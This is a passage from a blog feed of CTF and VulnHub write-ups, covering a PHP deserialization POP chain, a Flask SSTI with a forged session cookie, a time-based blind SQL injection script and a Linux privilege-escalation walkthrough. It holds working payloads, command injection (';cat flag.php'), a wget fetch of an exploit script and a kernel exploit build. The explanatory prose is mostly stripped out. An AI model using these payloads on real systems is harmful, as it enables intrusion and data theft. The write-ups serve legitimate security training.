class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nope"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__destruct()</code><br><code>evil()</code><br></p><blockquote><p><code>Start-&gt;Crypto-&gt;Reverse-&gt;Pwn-&gt;Web</code></p></blockquote><p><code>throw new Exception(&quot;Nope&quot;);</code>throwGC<br>php__destruct()<br> __destruct() throwdestructdestruct<br>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"good job but nothing"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Crypto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">-></span><span class="token property">errMsg</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$r</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">-></span><span class="token property">func</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$w</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br><code>a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:2:&quot;ls&quot;;&#125;&#125;&#125;&#125;&#125;i:1;r:2;&#125;</code><br><code>i:0</code><code>i:1</code>throw<code>__destruct()</code><br><code>a:2:&#123;i:1;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:2:&quot;ls&quot;;&#125;&#125;&#125;&#125;&#125;i:1;r:2;&#125;</code></p><p><img src="https://img-blog.csdnimg.cn/949cac6db39a4b47a7c3f37641e35358.png" alt="456"></p><h3 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h3><p>SSTI<br><img src="https://img-blog.csdnimg.cn/433667ad644a4d51bb2825e80fa85c05.png" alt="123"><br>url<code>http://007b1ed3-c9a0-400b-bc74-007f54a2966c.node4.buuoj.cn:81/download?file=1.jpg</code><br><br>dockerflask&#x2F;app&#x2F;app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template_string<span class="token keyword">from</span> config <span class="token keyword">import</span> secret_keyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># put application's code here</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/cancanneed"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cancanneed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    all_filename <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'img.html'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>filename<span class="token punctuation">,</span> all_filename<span class="token operator">=</span>all_filename<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> &lt;br> &lt;a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg&lt;/a>"</span></span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>        filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'../'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">"start"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/backdoor'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"guest"</span>        name <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>                <span class="token string">r'__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.'</span><span class="token punctuation">,</span>                name<span class="token punctuation">)</span><span class="token punctuation">:</span>            abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>                <span class="token string">'&lt;h1>%s&lt;/h1> &lt;br>  !&lt;br> !'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_find</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'404.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> config <span class="token keyword">import</span> secret_keyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>keysession<br>keyconfig.pykey<br>&#x2F;backdoor<br><img src="https://img-blog.csdnimg.cn/9e10aa25386245fcab49d3ac50e42782.png" alt="789"><br>guest<br>exp</p><blockquote><p><code>python flask_session_cookie_manager3.py encode -s &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot; -t &quot;&#123;&#39;user&#39;:\&quot;&#123;% print(()['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[280]('paste /y0U3_f14g_1s_h3re',shell=True,stdout=-1)['communic''ate']()[0]['strip']())%&#125;\&quot;&#125;&quot;</code></p></blockquote><h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><p><img src="https://img-blog.csdnimg.cn/b2e48cac738542c2b9d600cbb190c40b.png" alt="456"><br>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Author: f0njl//</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> datetimeurl <span class="token operator">=</span> <span class="token string">"http://5e08a16e-94a2-4d92-8e7a-85d3c1cf93b0.node4.buuoj.cn:81/?id="</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789asdfghjklzxcvbnmqwertyuiop&#125;&#123;-_."</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#payload = "1/**/and/**/if(substr(database(),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(2),1)--".format(i,j)</span>        <span class="token comment">#payload = "1/**/and/**/if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(3),1)--".format(i,j)</span>        payload <span class="token operator">=</span> <span class="token string">"1/**/and/**/if(substr((select/**/group_concat(id,name,price)/**/from/**/items),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(5),1)--"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>        sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds        <span class="token keyword">if</span> sec <span class="token operator">></span> <span class="token number">4</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h3><p>wp:cry:</p><p>app.pyapp.py</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#app.py</span><span class="token keyword">import</span> os<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span>Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>        data<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> data    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1<br><img src="https://img-blog.csdnimg.cn/ba72b904153041518054f8b91dc9fa42.png" alt="1"></p><p>flag<br><img src="https://img-blog.csdnimg.cn/08117b98aae246469e673400a37b8fd7.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lord-Of-The-Root-1-0-1</title>
      <link href="/2023/09/11/Lord-Of-The-Root-1-0-1/"/>
      <url>/2023/09/11/Lord-Of-The-Root-1-0-1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>1<a href="https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova</a> 2 &gt;1 &gt;2Ubuntu14.04 &gt;3UDF</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>nmap22ssh ssh <img src="https://img-blog.csdnimg.cn/090fe71b8b45414dbf63b1f3f996bf28.png" alt="45"> easy as 123 <strong>Port Knocking</strong></p><blockquote><p></p></blockquote><p>123 <strong></strong></p><ul><li>1 knock</li></ul><blockquote><p>konck 192.168.206.144 1 2 3 -v</p></blockquote><ul><li>2 nmap</li></ul><blockquote><p></p></blockquote><p><img src="https://img-blog.csdnimg.cn/7130abec22004654add004cd8a88ed15.png" alt="2"></p><p>nmap sql SQLmapsqllmap:</p><blockquote><p>sqlmap -o -u <a href="http://192.168.206.144:1337/978345210/index.php">http://192.168.206.144:1337/978345210/index.php</a> forms dbs</p></blockquote><p>ssh</p><blockquote><p>ssh <a href="mailto:&#115;&#109;&#x65;&#x61;&#103;&#111;&#108;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#x32;&#x30;&#x36;&#x2e;&#49;&#x34;&#x34;">&#115;&#109;&#x65;&#x61;&#103;&#111;&#108;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#x32;&#x30;&#x36;&#x2e;&#49;&#x34;&#x34;</a> MyPreciousR00t</p></blockquote><p></p><blockquote><p>uname -a Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p></blockquote><p> pythonhttp</p><blockquote><p>python -m http.server</p></blockquote><p></p><blockquote><p>wget <a href="http://192.168.206.1:8000/linux-exploit-suggester.sh">http://192.168.206.1:8000/linux-exploit-suggester.sh</a> chmod 777 linux-exploit-suggester.sh .&#x2F;linux-exploit-suggester.sh</p></blockquote><p> <strong>linpeas.sh</strong> Ubuntu14.04 <a href="https://www.exploit-db.com/exploits/39166">CVE-2015-8660</a></p><p></p><blockquote><p>gcc 39166.c -o dayu chmod 777 czy .&#x2F;dayu</p><p> <img src="https://img-blog.csdnimg.cn/58e4f735e80748d499a4ac198f5ae0fb.png" alt="1"> linpeas.sh <img src="https://img-blog.csdnimg.cn/d8c77bb96f4c484586bcd00c0c8e223e.png" alt="1"> rootpythonswitcher.py3door <strong>UDF</strong> exp</p></blockquote><p><img src="https://img-blog.csdnimg.cn/a1a2a7ff0ac242e8a35747b3d27ce149.png" alt="12"></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022</title>
      <link href="/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022/"/>
      <url>/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="Blackcat"><a href="#Blackcat" class="headerlink" title="Blackcat"></a>Blackcat</h3><blockquote><p>tipsstrings </p></blockquote><p>web<br><code>strings </code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Title<span class="token constant">APETAGEX</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$clandestine = getenv("clandestine");if(isset($_POST['</span>White<span class="token operator">-</span>cat<span class="token operator">-</span>monitor<span class="token string single-quoted-string">']))    $clandestine = hash_hmac('</span>sha256<span class="token string single-quoted-string">', $_POST['</span>White<span class="token operator">-</span>cat<span class="token operator">-</span>monitor<span class="token string single-quoted-string">'], $clandestine);$hh = hash_hmac('</span>sha256<span class="token string single-quoted-string">', $_POST['</span>One<span class="token operator">-</span>ear<span class="token string single-quoted-string">'], $clandestine);if($hh !== $_POST['</span>Black<span class="token operator">-</span>Cat<span class="token operator">-</span>Sheriff<span class="token string single-quoted-string">'])&#123;    die('</span><span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>POSTBlack-Cat-SheriffOne-earclandestineclandestinehash_hmachhhash_hmacPOSTBlack-Cat-Sheriffhh</p><p><strong>hash_hmac</strong><br><br>hash_hmac ( string $algo , string $data , string $key [, bool $raw_output &#x3D; FALSE ] ) : string<br></p><ul><li><p>algo<br>md5sha256haval160,4   hash_hmac_algos() </p></li><li><p>data<br></p></li><li><p>key<br> HMAC </p></li><li><p>raw_output<br> TRUE   FALSE  16 </p></li></ul><p><br> raw_output  TRUE   16   algo  FALSE<br><img src="https://img-blog.csdnimg.cn/6ee08b16227742af90dc5803049d27ba.png" alt="1"></p><p><img src="https://img-blog.csdnimg.cn/ca6ca0b3329c47ff8173d82eb56e2150.png" alt="2"></p><p></p><blockquote><p>hash_hmac($algo, $data, $key)<br>datanull</p></blockquote><p></p><blockquote><p>echo exec(nc.$_POST[One-ear]);</p><p><code>One-ear</code><code>;cat flag.php</code>flag<br>$clandestine &#x3D; hash_hmac(sha256, $_POST[White-cat-monitor], $clandestine);</p></blockquote><p><code>White-cat-monitor</code>clandestinenull</p><blockquote><p>if($hh !&#x3D;&#x3D; $_POST[Black-Cat-Sheriff])</p></blockquote><p>Black-Cat-Sheriff</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">";cat flag.php"</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);</code><code>$clandestine</code><code>$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);</code><code>$clandestine</code>null<br><img src="https://img-blog.csdnimg.cn/c011321dc2ce4571ade8bb4d58d9774c.png" alt="3"></p><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><blockquote><p>tips.htaccess</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token 